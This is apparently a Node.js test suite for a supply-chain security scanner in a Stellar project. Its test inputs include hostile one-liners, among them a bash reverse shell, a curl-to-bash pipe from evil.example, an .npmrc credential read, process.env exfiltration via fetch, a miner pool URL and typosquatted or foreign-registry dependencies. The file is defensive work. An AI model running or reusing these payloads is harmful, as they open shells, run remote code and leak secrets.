const test = require('node:test');
const assert = require('node:assert/strict');

const {
  scanAddedLines, scanFile, scanPackageJson, scanNpmLock, scanCargoLock, decide, classifyNewDependency, levenshtein,
} = require('./security-scan.cjs');

const config = {
  allowedHosts: ['stellar.org', 'github.com', 'localhost', 'example.com'],
  allowedAddresses: ['CBPUQN6CNJCNGPKNEXB7UM4T7RINKQB7HQI5CXEOSQ5EFRHE4G4VKPSQ'],
  dataPaths: ['**/__tests__/**', '**/*.md'],
  sensitivePaths: ['src/lib/stellar.ts'],
  allowedBinaries: [],
};
const lines = (...texts) => texts.map((text, i) => ({ line: i + 1, text }));
const rules = (findings) => findings.map((f) => `${f.severity}:${f.rule}`);

test('ordinary code produces no findings', () => {
  const f = scanAddedLines('src/routes/stats.ts', lines(
    "import { prisma } from '../db.js';",
    'export const total = (a: bigint, b: bigint) => a + b;',
    "const url = 'https://soroban-testnet.stellar.org';",
  ), config);
  assert.deepEqual(f, []);
});

test('Trojan Source characters block', () => {
  const f = scanAddedLines('src/a.ts', lines('const isAdmin = false; /* \u202E } \u2066if (isAdmin)\u2069 \u2066 begin admins only */'), config);
  assert.ok(rules(f).includes('block:hidden-unicode'));
  assert.ok(rules(scanAddedLines('src/a.ts', lines('const a\u200B = 1;'), config)).includes('block:hidden-unicode'));
});

test('miners, reverse shells and pipe-to-shell block', () => {
  assert.ok(rules(scanAddedLines('x.js', lines("connect('stratum+tcp://pool.example:3333')"), config)).includes('block:crypto-miner'));
  assert.ok(rules(scanAddedLines('x.sh', lines('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'), config)).includes('block:reverse-shell'));
  assert.ok(rules(scanAddedLines('x.yml', lines('run: curl -s https://evil.example/x.sh | bash'), config)).includes('block:pipe-to-shell'));
  assert.ok(rules(scanAddedLines('x.js', lines("fs.readFileSync(home + '/.npmrc')"), config)).includes('block:credential-file'));
});

test('dynamic code, process spawning, obfuscation and env collection need review', () => {
  assert.ok(rules(scanAddedLines('src/a.ts', lines('eval(payload)'), config)).includes('review:dynamic-code'));
  assert.ok(rules(scanAddedLines('src/a.ts', lines("const f = new Function('return 1')"), config)).includes('review:dynamic-code'));
  assert.ok(rules(scanAddedLines('src/a.ts', lines("require('child_process').exec(cmd)"), config)).includes('review:process-spawn'));
  assert.ok(rules(scanAddedLines('src/a.ts', lines('const s = "\\x68\\x74\\x74\\x70\\x73\\x3a\\x2f\\x2f\\x65\\x76\\x69\\x6c";'), config)).includes('review:obfuscation'));
  assert.ok(rules(scanAddedLines('src/a.ts', lines(`const blob = "${'QUJD'.repeat(60)}";`), config)).includes('review:long-encoded-string'));
  assert.ok(rules(scanAddedLines('src/a.ts', lines('fetch(u, { body: JSON.stringify(process.env) })'), config)).includes('review:env-exfiltration'));
});

test('unknown hosts and unknown Stellar addresses need review outside data paths', () => {
  assert.ok(rules(scanAddedLines('src/a.ts', lines("await fetch('https://collector.attacker.io/x')"), config)).includes('review:new-network-host'));
  assert.deepEqual(rules(scanAddedLines('src/a.ts', lines("fetch('https://horizon.stellar.org/x')"), config)), []);
  const drain = 'GDUPJTF3PNSYJ73WWLNTYLG6UXN7HHBKCGFEEMDFMWKWGR3UMQT3JG45';
  assert.ok(rules(scanAddedLines('src/lib/protocol.ts', lines(`const to = '${drain}';`), config)).includes('review:new-stellar-address'));
  assert.deepEqual(rules(scanAddedLines('src/a.ts', lines(`const id = '${config.allowedAddresses[0]}';`), config)), []);
  // Fixtures may hold addresses and URLs.
  assert.deepEqual(rules(scanAddedLines('src/__tests__/a.test.ts', lines(`const to = '${drain}'; fetch('https://x.io')`), config)), []);
});

test('a Stellar secret key in code needs review', () => {
  const secret = 'S' + 'A'.repeat(55);
  assert.ok(rules(scanAddedLines('src/a.ts', lines(`const k = '${secret}';`), config)).includes('review:wallet-secret'));
});

test('executables and unexpected binaries block; scripts and sensitive paths need review', () => {
  assert.ok(rules(scanFile('tools/helper.exe', 'A', Buffer.from('MZ'), config)).includes('block:executable-file'));
  assert.ok(rules(scanFile('src/data.ts', 'A', Buffer.from([0x61, 0, 0x62]), config)).includes('block:unexpected-binary'));
  assert.deepEqual(rules(scanFile('public/logo.png', 'A', Buffer.from([0x89, 0, 0x50]), config)), []);
  assert.ok(rules(scanFile('scripts/setup.sh', 'A', Buffer.from('echo hi'), config)).includes('review:script-file'));
  assert.ok(rules(scanFile('build.rs', 'A', Buffer.from('fn main(){}'), config)).includes('review:cargo-build-script'));
  assert.ok(rules(scanFile('src/lib/stellar.ts', 'M', Buffer.from('x'), config)).includes('review:sensitive-path'));
});

test('.npmrc registry overrides and tokens block', () => {
  assert.ok(rules(scanFile('.npmrc', 'A', Buffer.from('registry=https://npm.evil.io/'), config)).includes('block:registry-override'));
  assert.ok(rules(scanFile('.npmrc', 'A', Buffer.from('//registry.npmjs.org/:_authToken=abc'), config)).includes('block:npm-credentials'));
  assert.deepEqual(rules(scanFile('.npmrc', 'A', Buffer.from('engine-strict=true'), config)), []);
});

test('package.json: new deps need review, typosquats and non-registry sources block', () => {
  const base = JSON.stringify({ dependencies: { '@stellar/stellar-sdk': '14.0.0', fastify: '5.0.0' } });
  const add = (deps, scripts) => JSON.stringify({ dependencies: { '@stellar/stellar-sdk': '14.0.0', fastify: '5.0.0', ...deps }, scripts });
  assert.ok(rules(scanPackageJson('package.json', base, add({ zod: '3.0.0' }), config)).includes('review:new-dependency'));
  assert.ok(rules(scanPackageJson('package.json', base, add({ fastfiy: '5.0.0' }), config)).includes('block:typosquat'));
  assert.ok(rules(scanPackageJson('package.json', base, add({ util: 'github:evil/util' }), config)).includes('block:non-registry-dependency'));
  assert.ok(rules(scanPackageJson('package.json', base, add({}, { postinstall: 'node x.js' }), config)).includes('review:install-script'));
});

test('package.json: only changed specs are judged; in-repo folders need review, outside paths block', () => {
  const base = JSON.stringify({ dependencies: { client: 'file:vendor/client' } });
  assert.deepEqual(scanPackageJson('package.json', base, JSON.stringify({ dependencies: { client: 'file:vendor/client' }, version: '2' })), []);
  const head = (spec) => JSON.stringify({ dependencies: { client: spec } });
  assert.deepEqual(rules(scanPackageJson('package.json', base, head('file:vendor/client2'))), ['review:local-dependency']);
  assert.ok(rules(scanPackageJson('package.json', base, head('file:../../evil'))).includes('block:non-registry-dependency'));
  assert.ok(rules(scanPackageJson('package.json', base, head('file:/tmp/evil'))).includes('block:non-registry-dependency'));
  assert.ok(rules(scanPackageJson('package.json', base, head('https://evil.io/x.tgz'))).includes('block:non-registry-dependency'));
});

test('package.json: same-scope siblings and short names are not typosquats', () => {
  const base = JSON.stringify({ dependencies: { '@opentelemetry/sdk-node': '1.0.0', pg: '8.0.0' } });
  const head = (extra) => JSON.stringify({ dependencies: { '@opentelemetry/sdk-node': '1.0.0', pg: '8.0.0', ...extra } });
  assert.deepEqual(rules(scanPackageJson('package.json', base, head({ '@opentelemetry/sdk-node2': '1.0.0' }))), ['review:new-dependency']);
  assert.deepEqual(rules(scanPackageJson('package.json', base, head({ ws: '8.0.0' }))), ['review:new-dependency']);
  assert.ok(rules(scanPackageJson('package.json', base, head({ '@opentelemetrv/sdk-node': '1.0.0' }))).includes('block:typosquat'));
});

test('new dependencies: unknown blocks, established is info, fresh versions and young packages need review', () => {
  const dep = () => ({ severity: 'review', rule: 'new-dependency', path: 'package.json', message: 'Adds dependency x.', pkg: 'x' });
  assert.deepEqual(rules(classifyNewDependency(dep(), { exists: false }, {})), ['block:unknown-package']);
  const established = { exists: true, ageDays: 3000, weeklyDownloads: 5e6, version: '5.0.0', versionAgeDays: 40 };
  let f = dep(); classifyNewDependency(f, established, {}); assert.equal(f.severity, 'info');
  f = dep(); classifyNewDependency(f, { ...established, versionAgeDays: 0.5 }, {}); assert.equal(f.severity, 'review');
  assert.match(f.message, /published 12 hour/);
  f = dep(); classifyNewDependency(f, { ...established, ageDays: 10, weeklyDownloads: 30 }, {}); assert.equal(f.severity, 'review');
  f = dep(); classifyNewDependency(f, { exists: null }, {}); assert.equal(f.severity, 'review');
  assert.equal(decide([{ severity: 'info' }], false).state, 'success');
});

test('SVG with script needs review', () => {
  assert.ok(rules(scanFile('public/a.svg', 'A', Buffer.from('<svg onload="x()"></svg>'), config)).includes('review:svg-script'));
  assert.deepEqual(rules(scanFile('public/a.svg', 'A', Buffer.from('<svg><path d="M0 0"/></svg>'), config)), []);
});

test('package-lock.json: foreign hosts and missing integrity block; new install scripts need review', () => {
  const lock = (pkgs) => JSON.stringify({ packages: { '': {}, ...pkgs } });
  const good = { 'node_modules/a': { version: '1.0.0', resolved: 'https://registry.npmjs.org/a/-/a-1.0.0.tgz', integrity: 'sha512-x' } };
  assert.deepEqual(scanNpmLock('package-lock.json', lock(good), lock(good)), []);
  const evil = { 'node_modules/a': { version: '1.0.0', resolved: 'https://evil.io/a.tgz', integrity: 'sha512-x' } };
  assert.ok(rules(scanNpmLock('package-lock.json', lock(good), lock(evil))).includes('block:lockfile-host'));
  const noIntegrity = { 'node_modules/a': { version: '1.0.0', resolved: 'https://registry.npmjs.org/a/-/a-1.0.0.tgz' } };
  assert.ok(rules(scanNpmLock('package-lock.json', lock(good), lock(noIntegrity))).includes('block:lockfile-integrity'));
  const script = { 'node_modules/a': { ...good['node_modules/a'], hasInstallScript: true } };
  assert.ok(rules(scanNpmLock('package-lock.json', lock(good), lock(script))).includes('review:dependency-install-script'));
  assert.deepEqual(scanNpmLock('package-lock.json', lock(script), lock(script)), []);
});

test('Cargo.lock: crates must come from crates.io', () => {
  const ok = '[[package]]\nname = "soroban-sdk"\nsource = "registry+https://github.com/rust-lang/crates.io-index"\n';
  const git = '[[package]]\nname = "evil"\nsource = "git+https://github.com/evil/evil#abc"\n';
  assert.deepEqual(scanCargoLock('Cargo.lock', ok, config), []);
  assert.ok(rules(scanCargoLock('Cargo.lock', ok + git, config)).includes('block:crate-source'));
});

test('decision: blocks always fail; review findings pass only when reviewed', () => {
  const block = [{ severity: 'block' }];
  const review = [{ severity: 'review' }];
  assert.equal(decide([], false).state, 'success');
  assert.equal(decide(review, false).state, 'failure');
  assert.equal(decide(review, true).state, 'success');
  assert.equal(decide(block, true).state, 'failure');
});

test('edit distance', () => {
  assert.equal(levenshtein('fastify', 'fastfiy'), 2);
  assert.equal(levenshtein('zod', 'zod'), 0);
});
